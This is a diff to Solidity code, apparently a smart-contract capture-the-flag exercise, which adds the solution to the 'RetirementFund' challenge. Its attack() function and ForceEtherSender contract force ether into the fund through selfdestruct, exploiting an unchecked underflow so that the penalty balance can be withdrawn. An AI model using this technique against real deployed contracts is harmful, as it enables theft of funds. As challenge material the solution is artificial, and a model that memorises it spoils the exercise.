@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import "forge-std/console.sol";
+
 contract RetirementFund {
     uint256 startBalance;
     address owner = msg.sender;
@@ -23,12 +25,10 @@ contract RetirementFund {
 
         if (block.timestamp < expiration) {
             // early withdrawal incurs a 10% penalty
-            (bool ok, ) = msg.sender.call{
-                value: (address(this).balance * 9) / 10
-            }("");
+            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
             require(ok, "Transfer to msg.sender failed");
         } else {
-            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+            (bool ok,) = msg.sender.call{value: address(this).balance}("");
             require(ok, "Transfer to msg.sender failed");
         }
     }
@@ -38,13 +38,13 @@ contract RetirementFund {
         uint256 withdrawn = 0;
         unchecked {
             withdrawn += startBalance - address(this).balance;
-
+            //console.log(withdrawn);
             // an early withdrawal occurred
             require(withdrawn > 0);
         }
 
         // penalty is what's left
-        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
@@ -57,5 +57,28 @@ contract ExploitContract {
         retirementFund = _retirementFund;
     }
 
+    function attack() public {
+        //payable(address(retirementFund)).call{value: 1}("");
+        ForceEtherSender f = new ForceEtherSender{value: 1}();
+        f.forceSend(payable(address(retirementFund)));
+    }
+
     // write your exploit functions below
+}
+
+contract ForceEtherSender {
+    // Constructor to optionally receive Ether upon deployment
+    constructor() payable {}
+
+    // Function to allow the contract to receive Ether
+    receive() external payable {}
+
+    // Function to self-destruct and force-send Ether to an address
+    function forceSend(address payable recipient) external {
+        // Requires that the contract has a balance greater than 0
+        require(address(this).balance > 0, "No Ether to send");
+
+        // selfdestruct sends all Ether held by the contract to the recipient
+        selfdestruct(recipient);
+    }
 }
